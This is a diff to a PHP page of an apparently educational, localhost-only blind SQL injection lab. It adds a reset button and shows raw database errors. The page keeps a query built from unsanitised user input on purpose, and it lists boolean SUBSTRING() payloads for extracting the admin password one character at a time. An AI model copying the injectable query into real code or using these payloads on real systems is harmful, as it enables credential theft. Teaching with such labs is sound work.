@@ -4,58 +4,42 @@
 // SQL Injection Educational Lab
 // FOR EDUCATIONAL PURPOSES ONLY - localhost only
 // ============================================================
-//
-// VULNERABILITY: Boolean-based Blind SQL Injection
-// ------------------------------------------------
-// Unlike classic SQLi, the page does NOT display query results.
-// It only says "User exists" (TRUE) or "User not found" (FALSE).
-//
-// An attacker can still extract data by asking yes/no questions
-// using SUBSTRING() and observing which response the page gives.
-//
-// How it works step-by-step:
-//
-// 1. Check if admin exists (baseline):
-//    admin' AND '1'='1' --     -> "User exists" (TRUE)
-//
-// 2. Guess the first character of admin's password:
-//    admin' AND SUBSTRING(password,1,1)='a' --   -> TRUE  (first char is 'a')
-//    admin' AND SUBSTRING(password,1,1)='b' --   -> FALSE
-//
-// 3. Guess the second character:
-//    admin' AND SUBSTRING(password,2,1)='d' --   -> TRUE  (second char is 'd')
-//
-// 4. Continue character by character until the full password
-//    is reconstructed: a -> d -> m -> i -> n -> 1 -> 2 -> 3
-//
-// This is slow but fully automated in real attacks.
-// The key defense is the same: prepared statements.
-// ============================================================
 
 require_once 'db.php';
 
-$response = null;
-$query    = '';
+$response    = null;
+$query       = '';
+$errorDetail = '';
+$userCount   = 0;
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+// Handle reset
+if (isset($_POST['reset'])) {
+    resetUsersTable();
+}
+
+// Count users in the table (to show database status)
+try {
+    $pdo = getDB();
+    $userCount = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
+} catch (PDOException $e) {
+    // ignore
+}
+
+// Handle check
+if (isset($_POST['check'])) {
     $username = $_POST['username'] ?? '';
 
-    // =====================================================
     // VULNERABLE: Direct string concatenation
-    // Only a TRUE / FALSE response is returned to the user,
-    // but that single bit is enough to extract data.
-    // =====================================================
     $query = "SELECT * FROM users WHERE username='$username'";
 
     try {
         $pdo    = getDB();
         $stmt   = $pdo->query($query);
         $result = $stmt->fetchAll();
-
-        // Only reveal existence — never show actual data
         $response = count($result) > 0 ? 'TRUE' : 'FALSE';
     } catch (PDOException $e) {
         $response = 'ERROR';
+        $errorDetail = $e->getMessage();
     }
 }
 ?>
@@ -84,8 +68,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             width: 100%; padding: 10px 12px; margin-bottom: 16px; border: 1px solid #333;
             border-radius: 6px; background: #0d0d1a; color: #e0e0e0; font-size: 0.95rem;
         }
-        button { padding: 10px 24px; border: none; border-radius: 6px; background: #c62828; color: #fff; font-weight: bold; font-size: 0.95rem; cursor: pointer; }
-        button:hover { background: #e53935; }
+        .btn-row { display: flex; gap: 12px; }
+        button { padding: 10px 24px; border: none; border-radius: 6px; font-weight: bold; font-size: 0.95rem; cursor: pointer; }
+        button[name="check"] { background: #c62828; color: #fff; }
+        button[name="check"]:hover { background: #e53935; }
+        button[name="reset"] { background: #37474f; color: #fff; }
+        button[name="reset"]:hover { background: #546e7a; }
         .query-box { background: #0d0d1a; border: 1px solid #333; border-radius: 6px; padding: 14px; margin-bottom: 20px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #ffab91; word-break: break-all; }
         .query-box span { color: #666; }
         .response-box { text-align: center; padding: 32px; border-radius: 8px; margin-bottom: 24px; font-size: 1.4rem; font-weight: bold; }
@@ -93,6 +81,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         .response-box.false { background: #b71c1c33; color: #ff5252; border: 2px solid #c62828; }
         .response-box.error { background: #e6510033; color: #ffab91; border: 2px solid #e65100; }
         .response-box small { display: block; font-size: 0.8rem; font-weight: normal; margin-top: 6px; color: #aaa; }
+        .db-status { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 6px; padding: 10px 14px; margin-bottom: 16px; font-size: 0.85rem; }
+        .db-status.ok { border-color: #2e7d32; color: #69f0ae; }
+        .db-status.empty { border-color: #c62828; color: #ff5252; }
         .cheat-sheet { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 16px; }
         .cheat-sheet h3 { color: #00e5ff; margin-bottom: 12px; font-size: 1rem; }
         .cheat-sheet table { width: 100%; border-collapse: collapse; }
@@ -109,6 +100,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <h1>Blind SQL Injection</h1>
     <span class="tag">Vulnerable</span>
 
+    <!-- Database status -->
+    <?php if ($userCount > 0): ?>
+        <div class="db-status ok">Database: <?= $userCount ?> user(s) in table</div>
+    <?php else: ?>
+        <div class="db-status empty">Database: Table is EMPTY - click "Reset Database" below</div>
+    <?php endif; ?>
+
     <!-- Explanation -->
     <div class="info-box">
         <strong>What makes it "blind"?</strong><br>
@@ -118,25 +116,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <strong>Technique: Boolean-based extraction using SUBSTRING()</strong>
         <ol class="step-list">
             <li>Confirm the user exists:<br>
-                <code>admin' AND '1'='1' -- </code> &rarr; should return TRUE</li>
+                <code>admin' AND '1'='1</code> &rarr; should return TRUE</li>
             <li>Guess first character of password:<br>
-                <code>admin' AND SUBSTRING(password,1,1)='a' -- </code> &rarr; TRUE (it's 'a'!)</li>
+                <code>admin' AND SUBSTRING(password,1,1)='a</code> &rarr; TRUE (it's 'a'!)</li>
             <li>Guess second character:<br>
-                <code>admin' AND SUBSTRING(password,2,1)='d' -- </code> &rarr; TRUE (it's 'd'!)</li>
+                <code>admin' AND SUBSTRING(password,2,1)='d</code> &rarr; TRUE (it's 'd'!)</li>
             <li>Continue until the full password is reconstructed.</li>
         </ol>
     </div>
 
-    <!-- Search Form -->
+    <!-- Form -->
     <form method="POST">
         <label for="username">Check if User Exists</label>
         <input type="text" id="username" name="username"
-               placeholder="e.g. admin' AND SUBSTRING(password,1,1)='a' -- "
+               placeholder="admin' AND SUBSTRING(password,1,1)='a"
                value="<?= htmlspecialchars($_POST['username'] ?? '') ?>">
-        <button type="submit">Check</button>
+        <div class="btn-row">
+            <button type="submit" name="check" value="1">Check</button>
+            <button type="submit" name="reset" value="1">Reset Database</button>
+        </div>
     </form>
 
-    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+    <?php if ($response !== null): ?>
         <!-- Show the executed query -->
         <div class="query-box">
             <span>Executed SQL:</span><br>
@@ -157,45 +158,45 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <?php else: ?>
             <div class="response-box error">
                 ERROR &mdash; SQL syntax error
-                <small>The injected payload caused a syntax error</small>
+                <small><?= htmlspecialchars($errorDetail) ?></small>
             </div>
         <?php endif; ?>
     <?php endif; ?>
 
-    <!-- Cheat sheet for the admin password -->
+    <!-- Cheat sheet -->
     <div class="cheat-sheet">
         <h3>Quick Reference: Extracting admin's password character by character</h3>
         <p style="color:#aaa; font-size:0.82rem; margin-bottom:12px;">
-            The admin password is <strong>admin123</strong>. Try these payloads to see TRUE/FALSE responses:
+            The admin password is <strong>admin123</strong>. Try these payloads:
         </p>
         <table>
             <tr><th>Payload</th><th>Expected</th></tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,1,1)='a' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,1,1)='a</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,1,1)='b' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,1,1)='b</code></td>
                 <td><span class="false-mark">FALSE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,2,1)='d' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,2,1)='d</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,3,1)='m' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,3,1)='m</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,5,1)='n' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,5,1)='n</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND SUBSTRING(password,6,1)='1' -- </code></td>
+                <td><code>admin' AND SUBSTRING(password,6,1)='1</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
             <tr>
-                <td><code>admin' AND LENGTH(password)=8 -- </code></td>
+                <td><code>admin' AND LENGTH(password)='8</code></td>
                 <td><span class="true-mark">TRUE</span></td>
             </tr>
         </table>
